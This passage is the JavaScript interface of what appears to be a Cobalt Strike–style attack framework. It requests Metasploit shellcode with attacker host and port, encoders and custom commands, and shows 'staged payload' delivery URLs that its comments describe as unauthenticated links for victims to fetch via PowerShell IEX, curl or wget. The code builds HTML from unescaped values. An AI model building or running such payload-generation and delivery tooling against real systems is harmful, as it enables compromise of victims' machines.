    const btn = document.querySelector('[onclick="app.generateShellcodeMSF()"]');
    const payloadVal = document.getElementById('msfPayload').value;
    const data = {
        name: document.getElementById('msfName').value || 'msf_shellcode',
        payload: payloadVal,
        lhost: document.getElementById('msfLhost').value || '127.0.0.1',
        lport: parseInt(document.getElementById('msfLport').value) || 4444,
        format: document.getElementById('msfFormat').value,
        encoder: document.getElementById('msfEncoder').value
    };

    // 自定义命令处理
    if (payloadVal === 'custom/cmd') {
        const cmdInput = document.getElementById('msfCustomCmd');
        const customCmd = cmdInput ? cmdInput.value.trim() : '';
        if (!customCmd) {
            this._notify('请输入自定义命令 (custom_cmd)', 'error');
            return;
        }
        data.custom_cmd = customCmd;
        const targetOsEl = document.getElementById('msfTargetOs');
        data.target_os = targetOsEl ? targetOsEl.value : 'linux';
    }

    if (!data.name) { this._notify('请输入输出名称', 'error'); return; }

    if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    const loading = this._notify(`正在生成 Shellcode: ${data.payload}${data.custom_cmd ? ' [' + data.custom_cmd + ']' : ''}...`, 'loading', 0);

    API.post('/api/payload/shellcode/generate', data).then(res => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        loading.remove();
        if (res.success) {
            // shellcode API 返回 res.shellcode (代码字符串) 和 res.shellcode_size
            const code = res.shellcode || res.full_code || res.code_preview || '';
            const isBinary = data.format === 'raw';
            const filename = res.name ? res.name + '_shellcode.' + (data.format === 'c' ? 'c' : data.format === 'python' ? 'py' : data.format === 'hex' ? 'txt' : 'raw') : 'shellcode.' + data.format;
            this.showCodeModal(filename, code, isBinary);
            this.loadPayloads();
            const sizeInfo = res.shellcode_size ? ` (${res.shellcode_size} bytes)` : '';
            this._notify(`Shellcode 生成成功${sizeInfo}`, 'success');
        } else {
            this._notify('生成失败: ' + (res.error || '未知错误'), 'error');
        }
    }).catch(err => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        loading.remove();
        this._notify('生成失败: ' + (err.message || err), 'error');
    });
};

app.showCodeModal = function(filename, code, isBinary, deliveryUrl) {
    // code 可能为 undefined（如 EXE 二进制生成场景，只有文件无源码预览）
    const hasCode = code && String(code).trim() !== '';
    // 二进制文件或无源码时，强制使用下载模式
    const useDownload = isBinary || !hasCode;
    const safeCode = hasCode ? String(code).replace(/`/g, '\\`').replace(/\$/g, '\\$') : '';
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
    const downloadBtn = useDownload
        ? `<button class="btn btn-primary" onclick="window.open('/api/payload/download/${encodeURIComponent(filename)}?token=' + (window.API?.token || ''), '_blank')"><i class="fas fa-download"></i> 下载文件</button>`
        : `<button class="btn btn-primary" onclick="app.copyCodeModal(\`${safeCode}\`)"><i class="fas fa-copy"></i> 复制代码</button>`;
    const content = useDownload
        ? `<div style="background:#0d1117; border:1px solid #21262d; border-radius:8px; padding:24px; text-align:center;">
                    <i class="fas fa-file-binary" style="font-size:48px; color:#d29922; margin-bottom:12px;"></i>
                    <div style="font-size:14px; color:#c9d1d9; margin-bottom:8px;">${filename}</div>
                    <div style="font-size:12px; color:#8b949e;">${hasCode ? '' : '二进制文件已生成，请点击下方下载按钮获取'}</div>
                   </div>`
        : `<pre style="background:#0d1117; border:1px solid #21262d; border-radius:8px; padding:16px; overflow:auto; max-height:400px; font-size:12px; line-height:1.5; color:#c9d1d9;">${code}</pre>`;
    // 分发 URL 区块（参考 CS Staged Payload URL）
    const deliveryBox = deliveryUrl ? `
        <div style="background:#0d1117; border:1px solid #238636; border-radius:8px; padding:14px; margin-bottom:14px;">
            <div style="color:#3fb950; font-weight:600; font-size:12px; margin-bottom:8px;">
                <i class="fas fa-link"></i> 分发 URL (Staged Payload)
                <span style="color:#6e7681; font-weight:400; margin-left:6px;">参考 CS - 受害者可直接通过此 URL 下载</span>
            </div>
            <div style="display:flex; gap:8px; align-items:center;">
                <input type="text" class="input" id="deliveryUrlInput" value="${deliveryUrl}" readonly
                    style="flex:1; font-size:12px; color:#58a6ff; background:#161b22;">
                <button class="btn btn-secondary" style="font-size:11px; padding:6px 12px;" onclick="app._copyDeliveryUrl()">
                    <i class="fas fa-copy"></i> 复制
                </button>
                <button class="btn btn-secondary" style="font-size:11px; padding:6px 12px;" onclick="window.open('${deliveryUrl}', '_blank')">
                    <i class="fas fa-external-link-alt"></i> 打开
                </button>
            </div>
            <div style="font-size:11px; color:#6e7681; margin-top:6px;">
                <i class="fas fa-info-circle"></i> 此 URL 无需认证即可访问，可用于投递（powershell IEX、curl、wget 等）
            </div>
        </div>` : '';
    modal.innerHTML = `
                <div class="modal" style="max-width:800px;">
                    <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:16px;">
                        <h3 style="font-size:16px;"><i class="fas fa-check-circle" style="color:#3fb950;"></i> Payload 生成成功</h3>
                        <span class="badge badge-green">${filename}</span>
                    </div>
                    <div style="font-size:12px; color:#8b949e; margin-bottom:10px;">生成文件: server-go/payloads/${filename}</div>
                    ${deliveryBox}
                    ${content}
                    <div style="display:flex; gap:10px; margin-top:16px;">
                        <button class="btn btn-secondary" onclick="this.closest('.modal-overlay').remove()">关闭</button>
                        ${downloadBtn}
                    </div>
                </div>
            `;
    document.body.appendChild(modal);
};

// 复制分发 URL 到剪贴板
app._copyDeliveryUrl = function() {
    const inp = document.getElementById('deliveryUrlInput');
    if (!inp) return;
    inp.select();
    navigator.clipboard.writeText(inp.value)
        .then(() => this._notify('分发 URL 已复制', 'success'))
        .catch(() => this._notify('复制失败，请手动复制', 'error'));
};

app.copyCodeModal = function(code) {
    navigator.clipboard.writeText(code)
        .then(() => this._notify('代码已复制到剪贴板', 'success'))
        .catch(() => this._notify('复制失败，请手动复制', 'error'));
};

// 删除单个 Payload（参考 CS Payload Manager 的删除功能）
app.deletePayload = function(pid, name) {
    if (!confirm(`确认删除 Payload: ${name}？\n该操作会同时删除生成的文件`)) return;
    API.post(`/api/payloads/${pid}/delete`).then(r => {
        if (r.success) {
            this.loadPayloads();
            this._notify(`Payload "${name}" 已删除`, 'success');
        } else {
            this._notify('删除失败: ' + (r.error || '未知错误'), 'error');
        }
    }).catch(e => this._notify('删除失败: ' + (e.message || e), 'error'));
};

// 清空所有已生成 Payload
app.clearPayloads = function() {
    if (!confirm('确认清空所有已生成的 Payload？\n该操作会删除所有记录和生成的文件，不可恢复！')) return;
    API.post('/api/payloads/clear').then(r => {
        if (r.success) {
            this.payloads = [];
            this._refreshPayloadList();
            this._notify(`已清空所有 Payload（${r.deleted_files || 0} 个文件已删除）`, 'success');
        } else {
            this._notify('清空失败: ' + (r.error || '未知错误'), 'error');
        }
    }).catch(e => this._notify('清空失败: ' + (e.message || e), 'error'));
};

// 局部刷新"已生成 Payload"列表，避免全量重渲染导致左侧表单选项被重置
app._refreshPayloadList = function() {
    const container = document.getElementById('payloadListContainer');
    if (!container) return;
    container.innerHTML = this.payloads.length > 0 ? this.payloads.map(p => `
        <div style="padding:10px; border:1px solid #21262d; border-radius:8px; margin-bottom:8px;">
            <div style="display:flex; align-items:center; gap:10px; margin-bottom:6px;">
                <i class="fas ${p.type === 'shellcode' || p.type === 'dll' ? 'fa-microchip' : p.type === 'bat' ? 'fa-file-code' : p.type === 'sh' ? 'fa-terminal' : 'fa-bomb'}" style="color:${p.type === 'shellcode' || p.type === 'dll' ? '#bc8cff' : '#f85149'};"></i>
                <div style="flex:1; min-width:0;">
                    <div style="font-size:13px; font-weight:600;">${p.name}</div>
                    <div style="font-size:11px; color:#8b949e;">${p.type} | ${p.os}/${p.arch} | ${p.protocol}</div>
                </div>
                <span class="badge badge-green" style="flex-shrink:0;">${p.encryption || 'raw'}</span>
                <a href="/api/payload/download/${encodeURIComponent(p.download_filename || (p.name + '.' + (p.type === 'exe' ? 'exe' : p.type)))}?token=${window.API?.token || ''}" target="_blank" style="font-size:11px; color:#58a6ff; flex-shrink:0;" title="下载">
                    <i class="fas fa-download"></i>
                </a>
                <i class="fas fa-trash-alt" style="font-size:11px; color:#f85149; cursor:pointer; flex-shrink:0;" onclick="app.deletePayload(${p.id}, '${p.name}')" title="删除"></i>
            </div>
            ${p.delivery_url ? `
            <div style="display:flex; align-items:center; gap:6px; background:#0d1117; border:1px solid #238636; border-radius:4px; padding:4px 8px;">
                <i class="fas fa-link" style="font-size:10px; color:#3fb950;"></i>
                <span style="font-size:10px; color:#6e7681; flex-shrink:0;">URL:</span>
                <span style="font-size:10px; color:#58a6ff; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${p.delivery_url}">${p.delivery_url}</span>
                <i class="fas fa-copy" style="font-size:10px; color:#8b949e; cursor:pointer;" onclick="navigator.clipboard.writeText('${p.delivery_url}'); app._notify('URL已复制','success');" title="复制URL"></i>
                <i class="fas fa-external-link-alt" style="font-size:10px; color:#8b949e; cursor:pointer;" onclick="window.open('${p.delivery_url}','_blank')" title="打开"></i>
            </div>` : ''}
        </div>
    `).join('') : `<div style="text-align:center; padding:30px; color:#8b949e; font-size:13px;">暂无生成记录</div>`;
    // 同步更新清空按钮的显示状态
    const headerBtn = document.querySelector('.card .btn-danger[onclick="app.clearPayloads()"]');
    if (headerBtn) {
        headerBtn.style.display = this.payloads.length > 0 ? '' : 'none';
    }
};

